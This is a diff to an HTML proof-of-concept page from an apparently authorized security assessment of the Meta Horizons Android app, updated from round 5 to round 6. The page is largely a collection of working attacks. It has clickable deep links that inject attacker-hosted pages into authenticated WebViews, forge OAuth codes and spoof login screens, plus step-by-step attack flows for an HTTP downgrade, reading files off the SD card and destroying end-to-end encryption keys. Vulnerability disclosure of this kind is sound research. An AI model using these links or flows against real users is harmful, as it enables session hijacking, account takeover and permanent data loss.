@@ -17,6 +17,7 @@ h3 { color: #8b949e; font-size: 0.95em; margin-top: 16px; }
 .btn-payment { background: #d29922; color: #000; }
 .btn-native { background: #238636; }
 .btn-native:hover { background: #1a7f37; }
+.btn-info { background: #1f6feb; }
 code { background: #1a1a2e; padding: 2px 6px; border-radius: 4px; font-size: 0.9em; }
 pre { background: #1a1a2e; padding: 16px; border-radius: 8px; overflow-x: auto; font-size: 0.8em; }
 .info { color: #888; font-size: 0.9em; }
@@ -29,20 +30,20 @@ pre { background: #1a1a2e; padding: 16px; border-radius: 8px; overflow-x: auto; 
 </head>
 <body>
 <h1>Meta Horizons Security PoCs</h1>
-<p class="info">com.oculus.twilight v394.1.0.17.262 | Round 5 — 29 Findings</p>
+<p class="info">com.oculus.twilight v394.1.0.17.262 | Round 6 — 37 Findings</p>
 
 <div class="warning">
 <strong>Native Route Bypass:</strong> These deep links route to native Activities that bypass the React Native SceneTracker gate. They work on ANY device — no paired VR headset required. All dynamically confirmed via logcat activity chain tracing.
 </div>
 
 <div class="section">
-<h2>V-24: destination_url WebView Injection <span class="severity sev-high">HIGH</span></h2>
-<p>OAuth callback chain loads <code>destination_url</code> into authenticated WebView via <code>loadUrl()</code> without domain validation.</p>
+<h2>V-24 + V-51: destination_url WebView Injection + HTTP Downgrade <span class="severity sev-high">HIGH</span></h2>
+<p>OAuth callback chain loads <code>destination_url</code> into authenticated WebView. SecureWebView domain filter allows <code>*.facebook.com, *.meta.com, *.oculus.com, *.instagram.com</code> over HTTP — MITM enables content injection with session cookies.</p>
 <a class="btn btn-critical" href="oculus://discord_oauth/callback?code=INJECTED&state=CSRF&destination_url=https://poc.zere.es/meta-horizons/">
 V-24: OAuth → WebView Injection
 </a>
-<a class="btn btn-critical" href="oculus://oauth_iab_stitching/callback?destination_url=https://poc.zere.es/meta-horizons/">
-V-24: IAB Stitching Variant
+<a class="btn btn-critical" href="oculus://oauth_iab_stitching/callback?destination_url=http://www.meta.com/attacker-path">
+V-51: HTTP Downgrade Variant
 </a>
 </div>
 
@@ -52,6 +53,22 @@ V-24: IAB Stitching Variant
 <a class="btn btn-critical" href="oculus://tyi/mobile/redirect/?code=ATTACKER_TYI_CODE&state=FORGED_STATE">
 V-25: TYI OAuth Injection
 </a>
+</div>
+
+<div class="section">
+<h2>V-52: Sharing Module URI Grant → SD Card Read <span class="severity sev-high">HIGH</span></h2>
+<p>RN sharing modules grant URI read permission on SecureFileProvider backed by <code>external-path="/"</code> (entire SD card). Scope defaults to ANY_APP when <code>?s=</code> parameter is missing.</p>
+<p class="info">Requires attacker app as share target or JS execution in RN context to control mediaPath.</p>
+</div>
+
+<div class="section">
+<h2>V-45: Content Provider Access Token Leak <span class="severity sev-high">HIGH</span></h2>
+<p><code>FamilyAppsUserValuesProvider</code> returns <code>access_token</code> + <code>user_id</code> from <code>MetaSecureTokenStore</code>. Protected only by family app signature check (no manifest permission). Component disabled by default.</p>
+</div>
+
+<div class="section">
+<h2>V-46: E2EE Key Destruction via RN Module <span class="severity sev-high">HIGH</span></h2>
+<p><code>TwilightE2EEModule</code> exposes <code>deleteKeyStore()</code>, <code>purgeKeyOnCloud()</code>, <code>resetUserSecret()</code> to any RN JS code. No per-module authorization. Key destruction = permanent data loss.</p>
 </div>
 
 <div class="section">
@@ -74,16 +91,25 @@ V-28: Account Linking CSRF
 </div>
 
 <div class="section">
+<h2>V-48: Sessionless Payment Mutation <span class="severity sev-medium">MEDIUM</span></h2>
+<p><code>LoyaltyTopupMutation</code> in sessionless request whitelist — payment operation callable without authentication.</p>
+</div>
+
+<div class="section">
+<h2>V-47: Facebook Token Leak to JS <span class="severity sev-medium">MEDIUM</span></h2>
+<p><code>TwilightFacebook.fetchDataFromFacebookApp</code> returns raw Facebook <code>access_token</code> to RN JS caller.</p>
+</div>
+
+<div class="section">
 <h2>V-29: Consent Flow Trigger <span class="severity sev-low">LOW</span></h2>
-<p>Triggers consent UI via deep link. Consent payload fetch attempted with attacker's <code>flow_name</code>.</p>
 <a class="btn" href="oculus://consent-launcher/?flow_name=data_download&redirect_uri=https://poc.zere.es">
 V-29: Consent Flow Trigger
 </a>
 </div>
 
 <div class="section">
-<h3>Native Route Confirmation (Round 5)</h3>
-<p class="info">These deep links route directly to native Activities, confirmed via logcat <code>ActivityTaskManager: START</code>:</p>
+<h3>Native Route Confirmation (Round 5-6)</h3>
+<p class="info">Deep links routing directly to native Activities, confirmed via logcat:</p>
 <a class="btn btn-native" href="oculus://discord_oauth/callback?code=TEST">discord_oauth → MetaWebAuthActivity</a>
 <a class="btn btn-native" href="oculus://frl_login/?token=TEST&blob=TEST">frl_login → MetaWebAuthActivity</a>
 <a class="btn btn-native" href="oculus://oauth_account_linking/callback?code=TEST&state=TEST">oauth_account_linking → MetaWebAuthActivity</a>
@@ -91,49 +117,50 @@ V-29: Consent Flow Trigger
 
 <div class="section">
 <h2>Scene-Gated Routes (V-18 to V-22)</h2>
-<p class="info">These RN routes require a paired Quest headset (SceneTracker gate). Downgraded to Medium.</p>
+<p class="info">RN routes requiring paired Quest headset (SceneTracker gate). Medium severity.</p>
+<a class="btn" href="oculus://view/oc_mdc_loggedin_webview?url=https://poc.zere.es/meta-horizons/">V-18: MDC WebView</a>
+<a class="btn" href="oculus://view/third_party_login?loginURL=https://poc.zere.es/meta-horizons/&domain=poc.zere.es&caller_app_name=Spotify">V-19: Login Phishing</a>
+<a class="btn btn-payment" href="oculus://view/ocstore3_ds2_challenge?token=INJECTED&url=https://poc.zere.es/meta-horizons/">V-20: 3DS Challenge</a>
+<a class="btn" href="oculus://view/oc_webview?url=https://poc.zere.es/meta-horizons/&useInternalWebView=true">V-21: WebView</a>
+</div>
 
-<h3>V-18: Authenticated WebView (MDC) <span class="severity sev-medium">MEDIUM</span></h3>
-<a class="btn" href="oculus://view/oc_mdc_loggedin_webview?url=https://poc.zere.es/meta-horizons/">
-V-18: MDC WebView
-</a>
-
-<h3>V-19: Third-Party Login Phishing <span class="severity sev-medium">MEDIUM</span></h3>
-<a class="btn" href="oculus://view/third_party_login?loginURL=https://poc.zere.es/meta-horizons/&domain=poc.zere.es&caller_app_name=Spotify">
-V-19: Login Phishing
-</a>
-
-<h3>V-20: 3DS2 Payment Challenge <span class="severity sev-medium">MEDIUM</span></h3>
-<a class="btn btn-payment" href="oculus://view/ocstore3_ds2_challenge?token=INJECTED&url=https://poc.zere.es/meta-horizons/">
-V-20: 3DS Challenge
-</a>
-
-<h3>V-21: In-App WebView <span class="severity sev-medium">MEDIUM</span></h3>
-<a class="btn" href="oculus://view/oc_webview?url=https://poc.zere.es/meta-horizons/&useInternalWebView=true">
-V-21: WebView
-</a>
+<div class="section">
+<h3>Negative Results (Properly Gated)</h3>
+<p class="info">These attack vectors were tested and confirmed NOT exploitable:</p>
+<ul class="info">
+<li><code>force_nux_flow=true</code> — did NOT bypass app state requirements</li>
+<li><code>ocinternal_mobile_config_override</code> — properly gated by employee mode</li>
+<li>BloksScreenQuery deep link chaining — nested URLs NOT followed</li>
+<li>FamilyAppsUserValuesProvider (from shell) — SecurityException; family policy blocks non-Meta callers</li>
+</ul>
 </div>
 
 <pre>
-Attack Flow — V-24 (OAuth → WebView Injection):
-1. Open redirect on Meta OAuth endpoint sets destination_url=attacker.com
-2. oculus://discord_oauth/callback?...&destination_url=https://attacker.com
-3. MetaWebAuthenticationActivity processes callback → CALLBACK_URI_KEY
-4. AuthenticatedWebViewBaseActivity extracts destination_url
-5. loadUrl(destination_url) — NO domain validation
-6. Attacker JS runs in authenticated WebView with Meta cookies
+Attack Flow — V-24+V-51 (OAuth → HTTP Downgrade → WebView):
+1. Attacker crafts: oculus://oauth_iab_stitching/callback?destination_url=http://www.meta.com/path
+2. MetaWebAuthenticationActivity processes callback → CALLBACK_URI_KEY
+3. C049700z extracts destination_url from callback URI
+4. SecureWebView.loadUrl(destination_url) — HTTP passes domain filter
+5. MITM injects content in authenticated WebView with session cookies
 
-Attack Flow — V-25 (TYI Account Linking Hijack):
-1. Attacker initiates OAuth with third-party provider, captures code
-2. oculus://*/tyi/mobile/redirect/?code=ATTACKER_CODE&state=FORGED
-3. TwilightTYIOAuthRedirectActivity → Bloks server page
-4. code+state forwarded raw (no client-side state check)
-5. Victim's Horizons account links to attacker's identity
+Attack Flow — V-52 (Sharing → SD Card Read):
+1. Deep link / JS triggers sharing module (TwilightHorizonSharingModule)
+2. Module creates intent with FLAG_GRANT_READ_URI_PERMISSION
+3. URI: content://com.oculus.twilight.securefileprovider/...
+4. SecureFileProvider config: external-path path="/" (entire SD card)
+5. Scope fallback: ANY_APP when ?s= missing → isInScope() returns true
+6. Malicious receiving app reads arbitrary external storage files
+
+Attack Flow — V-46 (E2EE Key Destruction):
+1. Attacker achieves JS execution in RN context
+2. NativeModules.TwilightE2EEModule.deleteKeyStore()
+3. E2EE keys permanently destroyed — no recovery
+4. OR: createKeyStore({userSecret: "attacker"}) → attacker controls encryption
 </pre>
 
 <p class="info">
 Authorized security assessment — 2026-10-23<br>
-29 findings | Pixel 6a / Android 16 | Dynamic + static analysis
+37 findings | Pixel 6a / Android 16 | Dynamic + static analysis
 </p>
 </body>
 </html>
